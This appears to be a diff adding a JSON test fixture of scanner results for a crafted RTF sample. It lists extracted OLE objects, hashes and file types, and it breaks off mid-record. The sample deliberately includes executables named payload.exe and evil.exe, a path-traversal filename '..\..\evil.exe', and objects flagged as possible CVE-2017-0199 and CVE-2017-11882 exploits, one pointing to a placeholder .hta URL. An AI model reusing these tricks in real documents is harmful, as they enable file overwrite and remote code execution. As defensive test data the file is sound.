@@ -1,0 +1,1128 @@
+{
+  "form": 1,
+  "observables": {
+    "file:03ba05db6317fd6bd7227583402ca28e41454fb99641e279bf19404d5dd00ba7": {
+      "detections": {},
+      "directives": {},
+      "excluded_analysis": {},
+      "paths": {
+        "objects.rtf.rtfobj/objects.rtf_inner.rtf": {
+          "type=document.rtf": true,
+          "type=document.rtf.object": true
+        }
+      },
+      "redirection": "file:0d652dc8b0cc3ecb9d3111ea218e2f1f78fbe553fac50594a1aafc80e81a000b",
+      "relationships": {
+        "extracted_from file:0d652dc8b0cc3ecb9d3111ea218e2f1f78fbe553fac50594a1aafc80e81a000b": true
+      },
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": true,
+            "is_office_ext": true,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": true,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "text/rtf",
+            "type": "Rich Text Format data, version 1, ANSI"
+          },
+          "summary": "File Type Analysis: Rich Text Format data, version 1, ANSI (text/rtf) (ms office document) (rtf document)",
+          "tags": {}
+        },
+        "rtfole": {
+          "details": {
+            "extracted_files": [
+              "objects.rtf.rtfobj/objects.rtf_inner.rtf.rtfobj/objects.rtf_inner.rtf_deep.txt"
+            ],
+            "return_code": 0,
+            "stderr": "",
+            "stdout": "rtfobj 0.60.1 on Python 3.14.10 - http://decalage.info/python/oletools\nTHIS IS WORK IN PROGRESS - Check updates regularly!\nPlease report any issue at https://github.com/decalage2/oletools/issues\n\n===============================================================================\nFile: 'objects.rtf.rtfobj/objects.rtf_inner.rtf' - size: 284 bytes\n---+----------+---------------------------------------------------------------\nid |index     |OLE Object                                                     \n---+----------+---------------------------------------------------------------\n0  |00000032h |format_id: 2 (Embedded)                                        \n   |          |class name: b'Package'                                         \n   |          |data size: 82                                                  \n   |          |OLE Package object:                                            \n   |          |Filename: 'deep.txt'                                           \n   |          |Source path: 'C:\\\\tmp\\\\deep.txt'                               \n   |          |Temp path = 'C:\\\\tmp\\\\deep.txt'                                \n   |          |MD5 = 'dcadc8b1715f316ebd843b530eaf0a98'                       \n   |          |File Type: Unknown file type                                   \n---+----------+---------------------------------------------------------------\nSaving file from OLE Package in object #0:\n  Filename = 'deep.txt'\n  Source path = 'C:\\\\tmp\\\\deep.txt'\n  Temp path = 'C:\\\\tmp\\\\deep.txt'\n  saving to file objects.rtf.rtfobj/objects.rtf_inner.rtf.rtfobj/objects.rtf_inner.rtf_deep.txt\n  md5 dcadc8b1715f316ebd843b530eaf0a98\n"
+          },
+          "summary": "RTF OLE Object Analysis: extracted objects.rtf.rtfobj/objects.rtf_inner.rtf.rtfobj/objects.rtf_inner.rtf_deep.txt",
+          "tags": {}
+        }
+      },
+      "tags": {
+        "extracted_rtf": true,
+        "microsoft_office": true,
+        "rtf": true
+      }
+    },
+    "file:0d652dc8b0cc3ecb9d3111ea218e2f1f78fbe553fac50594a1aafc80e81a000b": {
+      "detections": {},
+      "directives": {},
+      "excluded_analysis": {},
+      "paths": {
+        "objects.rtf": {
+          "type=document.rtf": true,
+          "type=email.attachment": true
+        }
+      },
+      "relationships": {},
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": true,
+            "is_office_ext": true,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": true,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "text/rtf",
+            "type": "Rich Text Format data, version 1, ANSI"
+          },
+          "summary": "File Type Analysis: Rich Text Format data, version 1, ANSI (text/rtf) (ms office document) (rtf document)",
+          "tags": {}
+        },
+        "rtfole": {
+          "details": {
+            "extracted_files": [
+              "objects.rtf.rtfobj/objects.rtf_._._evil.exe",
+              "objects.rtf.rtfobj/objects.rtf_café.txt",
+              "objects.rtf.rtfobj/objects.rtf_copy.exe",
+              "objects.rtf.rtfobj/objects.rtf_inner.rtf",
+              "objects.rtf.rtfobj/objects.rtf_inner.zip",
+              "objects.rtf.rtfobj/objects.rtf_notes.txt",
+              "objects.rtf.rtfobj/objects.rtf_object_000004CE.noname",
+              "objects.rtf.rtfobj/objects.rtf_object_00000C9B.doc",
+              "objects.rtf.rtfobj/objects.rtf_object_0006C10E.bin",
+              "objects.rtf.rtfobj/objects.rtf_object_0006C1D7.bin",
+              "objects.rtf.rtfobj/objects.rtf_object_0006C280.bin",
+              "objects.rtf.rtfobj/objects.rtf_object_0006C319.raw",
+              "objects.rtf.rtfobj/objects.rtf_object_0006C3AE.package",
+              "objects.rtf.rtfobj/objects.rtf_object_0006C427.raw",
+              "objects.rtf.rtfobj/objects.rtf_object_0006C46A.raw",
+              "objects.rtf.rtfobj/objects.rtf_object_0006C482.raw",
+              "objects.rtf.rtfobj/objects.rtf_object_0006C4A6.raw",
+              "objects.rtf.rtfobj/objects.rtf_object_0006C4CB.raw",
+              "objects.rtf.rtfobj/objects.rtf_payload.exe"
+            ],
+            "return_code": 0,
+            "stderr": "",
+            "stdout": "rtfobj 0.60.1 on Python 3.14.10 - http://decalage.info/python/oletools\nTHIS IS WORK IN PROGRESS - Check updates regularly!\nPlease report any issue at https://github.com/decalage2/oletools/issues\n\n===============================================================================\nFile: 'objects.rtf' - size: 443613 bytes\n---+----------+---------------------------------------------------------------\nid |index     |OLE Object                                                     \n---+----------+---------------------------------------------------------------\n0  |00000032h |format_id: 2 (Embedded)                                        \n   |          |class name: b'Package'                                         \n   |          |data size: 130                                                 \n   |          |OLE Package object:                                            \n   |          |Filename: 'payload.exe'                                        \n   |          |Source path: 'C:\\\\tmp\\\\payload.exe'                            \n   |          |Temp path = 'C:\\\\tmp\\\\payload.exe'                             \n   |          |MD5 = '7eee65bdd94bad1115362808f3ddc287'                       \n   |          |EXECUTABLE FILE                                                \n   |          |File Type: Windows PE Executable or DLL                        \n---+----------+---------------------------------------------------------------\n1  |00000195h |format_id: 2 (Embedded)                                        \n   |          |class name: b'Package'                                         \n   |          |data size: 74                                                  \n   |          |OLE Package object:                                            \n   |          |Filename: 'notes.txt'                                          \n   |          |Source path: 'C:\\\\tmp\\\\notes.txt'                              \n   |          |Temp path = 'C:\\\\tmp\\\\notes.txt'                               \n   |          |MD5 = '293648d6849f1fd119dc9a0a3b2111c4'                       \n   |          |File Type: Unknown file type                                   \n---+----------+---------------------------------------------------------------\n2  |00000288h |format_id: 2 (Embedded)                                        \n   |          |class name: b'Package'                                         \n   |          |data size: 75                                                  \n   |          |OLE Package object:                                            \n   |          |Filename: 'notes.txt'                                          \n   |          |Source path: 'C:\\\\tmp\\\\notes.txt'                              \n   |          |Temp path = 'C:\\\\tmp\\\\notes.txt'                               \n   |          |MD5 = 'e6e2009c25fed5cc517280b9ae20dd94'                       \n   |          |File Type: Unknown file type                                   \n---+----------+---------------------------------------------------------------\n3  |0000037Dh |format_id: 2 (Embedded)                                        \n   |          |class name: b'Package'                                         \n   |          |data size: 121                                                 \n   |          |OLE Package object:                                            \n   |          |Filename: 'copy.exe'                                           \n   |          |Source path: 'C:\\\\tmp\\\\copy.exe'                               \n   |          |Temp path = 'C:\\\\tmp\\\\copy.exe'                                \n   |          |MD5 = '7eee65bdd94bad1115362808f3ddc287'                       \n   |          |EXECUTABLE FILE                                                \n   |          |File Type: Windows PE Executable or DLL                        \n---+----------+---------------------------------------------------------------\n4  |000004CEh |format_id: 2 (Embedded)                                        \n   |          |class name: b'Package'                                         \n   |          |data size: 54                                                  \n   |          |OLE Package object:                                            \n   |          |Filename: ''                                                   \n   |          |Source path: 'C:\\\\tmp\\\\'                                       \n   |          |Temp path = 'C:\\\\tmp\\\\'                                        \n   |          |MD5 = 'bd3ca0fce68c1d8c173d49817d9ddb39'                       \n   |          |File Type: Unknown file type                                   \n---+----------+---------------------------------------------------------------\n5  |00000599h |format_id: 2 (Embedded)                                        \n   |          |class name: b'Package'                                         \n   |          |data size: 92                                                  \n   |          |OLE Package object:                                            \n   |          |Filename: '..\\\\..\\\\evil.exe'                                   \n   |          |Source path: 'C:\\\\tmp\\\\..\\\\..\\\\evil.exe'                       \n   |          |Temp path = 'C:\\\\tmp\\\\..\\\\..\\\\evil.exe'                        \n   |          |MD5 = 'd20e54d92df4c38d25aa6da2fed55048'                       \n   |          |EXECUTABLE FILE                                                \n   |          |File Type: Unknown file type                                   \n---+----------+---------------------------------------------------------------\n6  |000006B0h |format_id: 2 (Embedded)                                        \n   |          |class name: b'Package'                                         \n   |          |data size: 73                                                  \n   |          |OLE Package object:                                            \n   |          |Filename: 'café.txt'                                           \n   |          |Source path: 'C:\\\\tmp\\\\café.txt'                               \n   |          |Temp path = 'C:\\\\tmp\\\\café.txt'                                \n   |          |MD5 = '0209842190678e76c8cde9396fb47c03'                       \n   |          |File Type: Unknown file type                                   \n---+----------+---------------------------------------------------------------\n7  |000007A1h |format_id: 2 (Embedded)                                        \n   |          |class name: b'Package'                                         \n   |          |data size: 200                                                 \n   |          |OLE Package object:                                            \n   |          |Filename: 'inner.zip'                                          \n   |          |Source path: 'C:\\\\tmp\\\\inner.zip'                              \n   |          |Temp path = 'C:\\\\tmp\\\\inner.zip'                               \n   |          |MD5 = '14d57035f615366f5cce89f349e536e3'                       \n   |          |File Type: Zip Archive                                         \n---+----------+---------------------------------------------------------------\n8  |00000990h |format_id: 2 (Embedded)                                        \n   |          |class name: b'Package'                                         \n   |          |data size: 342                                                 \n   |          |OLE Package object:                                            \n   |          |Filename: 'inner.rtf'                                          \n   |          |Source path: 'C:\\\\tmp\\\\inner.rtf'                              \n   |          |Temp path = 'C:\\\\tmp\\\\inner.rtf'                               \n   |          |MD5 = '1ea31c570e44139e7cdce957f5cc987b'                       \n   |          |File Type: RTF                                                 \n---+----------+---------------------------------------------------------------\n9  |00000C9Bh |format_id: 2 (Embedded)                                        \n   |          |class name: b'Word.Document.8'                                 \n   |          |data size: 219648                                              \n   |          |MD5 = '5fb3cfffa94f1adebde4005aaa4b70fa'                       \n   |          |CLSID: 00020906-0000-0000-C000-000000000046                    \n   |          |Microsoft Word 97-2003 Document (Word.Document.8)              \n---+----------+---------------------------------------------------------------\n10 |0006C10Eh |format_id: 2 (Embedded)                                        \n   |          |class name: b'OLE2Link'                                        \n   |          |data size: 50                                                  \n   |          |MD5 = 'a427aed1062f0967954d65956ea8436c'                       \n   |          |Possibly an exploit for the OLE2Link vulnerability (VU#921560, \n   |          |CVE-2017-0199)                                                 \n   |          |URL extracted: http://example.com/a.hta                        \n---+----------+---------------------------------------------------------------\n11 |0006C1D7h |format_id: 2 (Embedded)                                        \n   |          |class name: b'Equation.3'                                      \n   |          |data size: 32                                                  \n   |          |MD5 = 'a0170bb1f4cf041f179e409ccbfe4f6a'                       \n   |          |Possibly an exploit for the Equation Editor vulnerability      \n   |          |(VU#421280, CVE-2017-11882)                                    \n---+----------+---------------------------------------------------------------\n12 |0006C280h |format_id: 2 (Embedded)                                        \n   |          |class name: b'Paint.Picture'                                   \n   |          |data size: 21                                                  \n   |          |MD5 = '7c20d7c48a3f02cf48b965c0ed29c0d2'                       \n---+----------+---------------------------------------------------------------\n13 |0006C319h |Not a well-formed OLE object                                   \n---+----------+---------------------------------------------------------------\n14 |0006C3AEh |format_id: 2 (Embedded)                                        \n   |          |class name: b'Package'                                         \n   |          |data size: 11                                                  \n   |          |MD5 = '9e2415fa3149575a2b03c57bfb773f6b'                       \n---+----------+---------------------------------------------------------------\n15 |0006C427h |Not a well-formed OLE object                                   \n---+----------+---------------------------------------------------------------\n16 |0006C46Ah |Not a well-formed OLE object                                   \n---+----------+---------------------------------------------------------------\n17 |0006C482h |Not a well-formed OLE object                                   \n---+----------+---------------------------------------------------------------\n18 |0006C4A6h |Not a well-formed OLE object                                   \n---+----------+---------------------------------------------------------------\n19 |0006C4CBh |Not a well-formed OLE object                                   \n---+----------+---------------------------------------------------------------\nSaving file from OLE Package in object #0:\n  Filename = 'payload.exe'\n  Source path = 'C:\\\\tmp\\\\payload.exe'\n  Temp path = 'C:\\\\tmp\\\\payload.exe'\n  saving to file objects.rtf.rtfobj/objects.rtf_payload.exe\n  md5 7eee65bdd94bad1115362808f3ddc287\nSaving file from OLE Package in object #1:\n  Filename = 'notes.txt'\n  Source path = 'C:\\\\tmp\\\\notes.txt'\n  Temp path = 'C:\\\\tmp\\\\notes.txt'\n  saving to file objects.rtf.rtfobj/objects.rtf_notes.txt\n  md5 293648d6849f1fd119dc9a0a3b2111c4\nSaving file from OLE Package in object #2:\n  Filename = 'notes.txt'\n  Source path = 'C:\\\\tmp\\\\notes.txt'\n  Temp path = 'C:\\\\tmp\\\\notes.txt'\n  saving to file objects.rtf.rtfobj/objects.rtf_notes.txt\n  md5 e6e2009c25fed5cc517280b9ae20dd94\nSaving file from OLE Package in object #3:\n  Filename = 'copy.exe'\n  Source path = 'C:\\\\tmp\\\\copy.exe'\n  Temp path = 'C:\\\\tmp\\\\copy.exe'\n  saving to file objects.rtf.rtfobj/objects.rtf_copy.exe\n  md5 7eee65bdd94bad1115362808f3ddc287\nSaving file from OLE Package in object #4:\n  Filename = ''\n  Source path = 'C:\\\\tmp\\\\'\n  Temp path = 'C:\\\\tmp\\\\'\n  saving to file objects.rtf.rtfobj/objects.rtf_object_000004CE.noname\n  md5 bd3ca0fce68c1d8c173d49817d9ddb39\nSaving file from OLE Package in object #5:\n  Filename = '..\\\\..\\\\evil.exe'\n  Source path = 'C:\\\\tmp\\\\..\\\\..\\\\evil.exe'\n  Temp path = 'C:\\\\tmp\\\\..\\\\..\\\\evil.exe'\n  saving to file objects.rtf.rtfobj/objects.rtf_._._evil.exe\n  md5 d20e54d92df4c38d25aa6da2fed55048\nSaving file from OLE Package in object #6:\n  Filename = 'café.txt'\n  Source path = 'C:\\\\tmp\\\\café.txt'\n  Temp path = 'C:\\\\tmp\\\\café.txt'\n  saving to file objects.rtf.rtfobj/objects.rtf_café.txt\n  md5 0209842190678e76c8cde9396fb47c03\nSaving file from OLE Package in object #7:\n  Filename = 'inner.zip'\n  Source path = 'C:\\\\tmp\\\\inner.zip'\n  Temp path = 'C:\\\\tmp\\\\inner.zip'\n  saving to file objects.rtf.rtfobj/objects.rtf_inner.zip\n  md5 14d57035f615366f5cce89f349e536e3\nSaving file from OLE Package in object #8:\n  Filename = 'inner.rtf'\n  Source path = 'C:\\\\tmp\\\\inner.rtf'\n  Temp path = 'C:\\\\tmp\\\\inner.rtf'\n  saving to file objects.rtf.rtfobj/objects.rtf_inner.rtf\n  md5 1ea31c570e44139e7cdce957f5cc987b\nSaving file embedded in OLE object #9:\n  format_id  = 2\n  class name = b'Word.Document.8'\n  data size  = 219648\n  saving to file objects.rtf.rtfobj/objects.rtf_object_00000C9B.doc\n  md5 5fb3cfffa94f1adebde4005aaa4b70fa\nSaving file embedded in OLE object #10:\n  format_id  = 2\n  class name = b'OLE2Link'\n  data size  = 50\n  saving to file objects.rtf.rtfobj/objects.rtf_object_0006C10E.bin\n  md5 a427aed1062f0967954d65956ea8436c\nSaving file embedded in OLE object #11:\n  format_id  = 2\n  class name = b'Equation.3'\n  data size  = 32\n  saving to file objects.rtf.rtfobj/objects.rtf_object_0006C1D7.bin\n  md5 a0170bb1f4cf041f179e409ccbfe4f6a\nSaving file embedded in OLE object #12:\n  format_id  = 2\n  class name = b'Paint.Picture'\n  data size  = 21\n  saving to file objects.rtf.rtfobj/objects.rtf_object_0006C280.bin\n  md5 7c20d7c48a3f02cf48b965c0ed29c0d2\nSaving raw data in object #13:\n  saving object to file objects.rtf.rtfobj/objects.rtf_object_0006C319.raw\n  md5 3423babc3efa0595f4daa83c5fe84cba\nSaving file embedded in OLE object #14:\n  format_id  = 2\n  class name = b'Package'\n  data size  = 11\n  saving to file objects.rtf.rtfobj/objects.rtf_object_0006C3AE.package\n  md5 9e2415fa3149575a2b03c57bfb773f6b\nSaving raw data in object #15:\n  saving object to file objects.rtf.rtfobj/objects.rtf_object_0006C427.raw\n  md5 591c79c6716b430e20f16b0f0784b490\nSaving raw data in object #16:\n  saving object to file objects.rtf.rtfobj/objects.rtf_object_0006C46A.raw\n  md5 d41d8cd98f00b204e9800998ecf8427e\nSaving raw data in object #17:\n  saving object to file objects.rtf.rtfobj/objects.rtf_object_0006C482.raw\n  md5 902fbdd2b1df0c4f70b4a5d23525e932\nSaving raw data in object #18:\n  saving object to file objects.rtf.rtfobj/objects.rtf_object_0006C4A6.raw\n  md5 2ecdde3959051d913f61b14579ea136d\nSaving raw data in object #19:\n  saving object to file objects.rtf.rtfobj/objects.rtf_object_0006C4CB.raw\n  md5 c4d15b255ef3c6a89d1fe2e6a26b8eda\n"
+          },
+          "summary": "RTF OLE Object Analysis: extracted objects.rtf.rtfobj/objects.rtf_._._evil.exe, objects.rtf.rtfobj/objects.rtf_café.txt, objects.rtf.rtfobj/objects.rtf_copy.exe, objects.rtf.rtfobj/objects.rtf_inner.rtf, objects.rtf.rtfobj/objects.rtf_inner.zip, objects.rtf.rtfobj/objects.rtf_notes.txt, objects.rtf.rtfobj/objects.rtf_object_000004CE.noname, objects.rtf.rtfobj/objects.rtf_object_00000C9B.doc, objects.rtf.rtfobj/objects.rtf_object_0006C10E.bin, objects.rtf.rtfobj/objects.rtf_object_0006C1D7.bin, objects.rtf.rtfobj/objects.rtf_object_0006C280.bin, objects.rtf.rtfobj/objects.rtf_object_0006C319.raw, objects.rtf.rtfobj/objects.rtf_object_0006C3AE.package, objects.rtf.rtfobj/objects.rtf_object_0006C427.raw, objects.rtf.rtfobj/objects.rtf_object_0006C46A.raw, objects.rtf.rtfobj/objects.rtf_object_0006C482.raw, objects.rtf.rtfobj/objects.rtf_object_0006C4A6.raw, objects.rtf.rtfobj/objects.rtf_object_0006C4CB.raw, objects.rtf.rtfobj/objects.rtf_payload.exe",
+          "tags": {}
+        }
+      },
+      "tags": {
+        "microsoft_office": true,
+        "rtf": true
+      }
+    },
+    "file:0f115ca839a52b50eeb4d9e58da5027231f1982dc16796439535f72abb60d6d4": {
+      "detections": {},
+      "directives": {},
+      "excluded_analysis": {},
+      "paths": {
+        "objects.rtf.rtfobj/objects.rtf_object_0006C319.raw": {
+          "type=document.rtf.object": true
+        }
+      },
+      "redirection": "file:0d652dc8b0cc3ecb9d3111ea218e2f1f78fbe553fac50594a1aafc80e81a000b",
+      "relationships": {
+        "extracted_from file:0d652dc8b0cc3ecb9d3111ea218e2f1f78fbe553fac50594a1aafc80e81a000b": true
+      },
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "application/octet-stream",
+            "type": "ctab data"
+          },
+          "summary": "File Type Analysis: ctab data (application/octet-stream)",
+          "tags": {}
+        }
+      },
+      "tags": {
+        "extracted_rtf": true
+      }
+    },
+    "file:24c8ac280a812e419c1c8ee1f4115b1a39ddadb5a33e996d7126f27ca067b324": {
+      "detections": {},
+      "directives": {},
+      "excluded_analysis": {},
+      "paths": {
+        "objects.rtf.rtfobj/objects.rtf_café.txt": {
+          "type=document.rtf.object": true
+        }
+      },
+      "redirection": "file:0d652dc8b0cc3ecb9d3111ea218e2f1f78fbe553fac50594a1aafc80e81a000b",
+      "relationships": {
+        "extracted_from file:0d652dc8b0cc3ecb9d3111ea218e2f1f78fbe553fac50594a1aafc80e81a000b": true
+      },
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "text/plain",
+            "type": "ASCII text"
+          },
+          "summary": "File Type Analysis: ASCII text (text/plain)",
+          "tags": {}
+        }
+      },
+      "tags": {
+        "extracted_rtf": true
+      }
+    },
+    "file:2bf0a9bb0aa6a233db45d8fb3b638beb0122581a392e3d6351c8e4b733a3b932": {
+      "detections": {},
+      "directives": {},
+      "excluded_analysis": {},
+      "paths": {
+        "objects.rtf.rtfobj/objects.rtf_copy.exe": {
+          "type=document.rtf.object": true,
+          "type=executable": true
+        },
+        "objects.rtf.rtfobj/objects.rtf_payload.exe": {
+          "type=document.rtf.object": true,
+          "type=executable": true
+        }
+      },
+      "redirection": "file:0d652dc8b0cc3ecb9d3111ea218e2f1f78fbe553fac50594a1aafc80e81a000b",
+      "relationships": {
+        "extracted_from file:0d652dc8b0cc3ecb9d3111ea218e2f1f78fbe553fac50594a1aafc80e81a000b": true
+      },
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": true,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "text/plain",
+            "type": "Non-ISO extended-ASCII text, with no line terminators"
+          },
+          "summary": "File Type Analysis: Non-ISO extended-ASCII text, with no line terminators (text/plain) (portable executable)",
+          "tags": {}
+        }
+      },
+      "tags": {
+        "executable": true,
+        "extracted_rtf": true
+      }
+    },
+    "file:2ff48d75daf105d38ca236d31cfb46841b5f3536e6c334fb9c53f3afa2eda2df": {
+      "detections": {},
+      "directives": {},
+      "excluded_analysis": {},
+      "paths": {
+        "objects.rtf.rtfobj/objects.rtf_inner.rtf.rtfobj/objects.rtf_inner.rtf_deep.txt": {
+          "type=document.rtf.object": true
+        }
+      },
+      "redirection": "file:03ba05db6317fd6bd7227583402ca28e41454fb99641e279bf19404d5dd00ba7",
+      "relationships": {
+        "extracted_from file:03ba05db6317fd6bd7227583402ca28e41454fb99641e279bf19404d5dd00ba7": true
+      },
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "text/plain",
+            "type": "ASCII text"
+          },
+          "summary": "File Type Analysis: ASCII text (text/plain)",
+          "tags": {}
+        }
+      },
+      "tags": {
+        "extracted_rtf": true
+      }
+    },
+    "file:350a229d177d0b15a711ffa88b723aa42b88e9d90a03165bb5bf145d24bd25d5": {
+      "detections": {},
+      "directives": {},
+      "excluded_analysis": {},
+      "paths": {
+        "objects.rtf.rtfobj/objects.rtf_object_0006C1D7.bin": {
+          "type=document.rtf.object": true
+        }
+      },
+      "redirection": "file:0d652dc8b0cc3ecb9d3111ea218e2f1f78fbe553fac50594a1aafc80e81a000b",
+      "relationships": {
+        "extracted_from file:0d652dc8b0cc3ecb9d3111ea218e2f1f78fbe553fac50594a1aafc80e81a000b": true
+      },
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "application/octet-stream",
+            "type": "data"
+          },
+          "summary": "File Type Analysis: data (application/octet-stream)",
+          "tags": {}
+        }
+      },
+      "tags": {
+        "extracted_rtf": true
+      }
+    },
+    "file:44e9d0d4930ff40a7d26c157901787e27b29699eaa20c610006486c66e91c414": {
+      "detections": {},
+      "directives": {},
+      "excluded_analysis": {},
+      "paths": {
+        "objects.rtf.rtfobj/objects.rtf_inner.zip": {
+          "type=document.rtf.object": true
+        }
+      },
+      "redirection": "file:0d652dc8b0cc3ecb9d3111ea218e2f1f78fbe553fac50594a1aafc80e81a000b",
+      "relationships": {
+        "extracted_from file:0d652dc8b0cc3ecb9d3111ea218e2f1f78fbe553fac50594a1aafc80e81a000b": true
+      },
+      "results": {
+        "archive": {
+          "details": {
+            "extracted_files": [
+              "inner.txt"
+            ],
+            "extraction_error": null,
+            "file_count": 1
+          },
+          "summary": "Archive Analysis: extracted 1 of 1 files: (inner.txt)",
+          "tags": {
+            "single_file_zip": true
+          }
+        },
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": true,
+            "mime": "application/zip",
+            "type": "Zip archive data, made by v2.0 UNIX, extract using at least v2.0, last modified Jan 01 2020 00:00:00, uncompressed size 26, method=store"
+          },
+          "summary": "File Type Analysis: Zip archive data, made by v2.0 UNIX, extract using at least v2.0, last modified Jan 01 2020 00:00:00, uncompressed size 26, method=store (application/zip) (zip archive)",
+          "tags": {}
+        },
+        "olevba_v1_2": {
+          "details": {
+            "keyword_summary": {},
+            "macros": [],
+            "type": "OpenXML"
+          },
+          "summary": null,
+          "tags": {}
+        }
+      },
+      "tags": {
+        "extracted_rtf": true,
+        "zip": true
+      }
+    },
+    "file:6f5e3b2919a49801e3f664b17abbc7cd24086ec87fa04ceca06851b463fc496c": {
+      "detections": {},
+      "directives": {},
+      "excluded_analysis": {},
+      "paths": {
+        "objects.rtf.rtfobj/objects.rtf_object_0006C10E.bin": {
+          "type=document.rtf.object": true
+        }
+      },
+      "redirection": "file:0d652dc8b0cc3ecb9d3111ea218e2f1f78fbe553fac50594a1aafc80e81a000b",
+      "relationships": {
+        "extracted_from file:0d652dc8b0cc3ecb9d3111ea218e2f1f78fbe553fac50594a1aafc80e81a000b": true
+      },
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "application/octet-stream",
+            "type": "data"
+          },
+          "summary": "File Type Analysis: data (application/octet-stream)",
+          "tags": {}
+        }
+      },
+      "tags": {
+        "extracted_rtf": true
+      }
+    },
+    "file:702e587851fd626026066f7511a9e46c24adac1bb0e5fbb556d28d38e51c733d": {
+      "detections": {},
+      "directives": {},
+      "excluded_analysis": {},
+      "paths": {
+        "objects.rtf.rtfobj/objects.rtf_object_0006C4CB.raw": {
+          "type=document.rtf.object": true
+        }
+      },
+      "redirection": "file:0d652dc8b0cc3ecb9d3111ea218e2f1f78fbe553fac50594a1aafc80e81a000b",
+      "relationships": {
+        "extracted_from file:0d652dc8b0cc3ecb9d3111ea218e2f1f78fbe553fac50594a1aafc80e81a000b": true
+      },
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "text/plain",
+            "type": "ASCII text, with no line terminators"
+          },
+          "summary": "File Type Analysis: ASCII text, with no line terminators (text/plain)",
+          "tags": {}
+        }
+      },
+      "tags": {
+        "extracted_rtf": true
+      }
+    },
+    "file:8d26a25ee377b3a0e3ac80c2b94428810d1a0cf964556e9627f572c1d7926427": {
+      "detections": {},
+      "directives": {
+        "sandbox": true
+      },
+      "excluded_analysis": {
+        "olevba_v1_2": true
+      },
+      "paths": {
+        "objects.rtf.rtfobj/objects.rtf_object_00000C9B.doc.olevba/macro_4.bas": {
+          "type=script.macro.vba": true
+        }
+      },
+      "redirection": "file:a363fb24edce3162326238d0152b99845d0dd0be53191183aad2ceba2d168a2a",
+      "relationships": {},
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "text/plain",
+            "type": "ASCII text"
+          },
+          "summary": "File Type Analysis: ASCII text (text/plain)",
+          "tags": {}
+        }
+      },
+      "tags": {
+        "macro": true
+      }
+    },
+    "file:8ea859127f6cc0b8fa96d38e3f7306958602495945e22be211074706cfd66aa6": {
+      "detections": {},
+      "directives": {},
+      "excluded_analysis": {},
+      "paths": {
+        "objects.rtf.rtfobj/objects.rtf_object_0006C427.raw": {
+          "type=document.rtf.object": true
+        }
+      },
+      "redirection": "file:0d652dc8b0cc3ecb9d3111ea218e2f1f78fbe553fac50594a1aafc80e81a000b",
+      "relationships": {
+        "extracted_from file:0d652dc8b0cc3ecb9d3111ea218e2f1f78fbe553fac50594a1aafc80e81a000b": true
+      },
+      "results": {
+        "file_type": {
+          "details": {
+            "is_email_file": false,
+            "is_jar_file": false,
+            "is_lnk_file": false,
+            "is_office_document": false,
+            "is_office_ext": false,
+            "is_ole_file": false,
+            "is_pdf_file": false,
+            "is_pe_file": false,
+            "is_rtf_file": false,
+            "is_x509": false,
+            "is_zip_file": false,
+            "mime": "text/plain",
+            "type": "ASCII text"
+          },
+          "summary": "File Type Analysis: ASCII text (text/plain)",
+          "tags": {}
+        }
+      },
+      "tags": {
+        "extracted_rtf": true
+      }
+    },
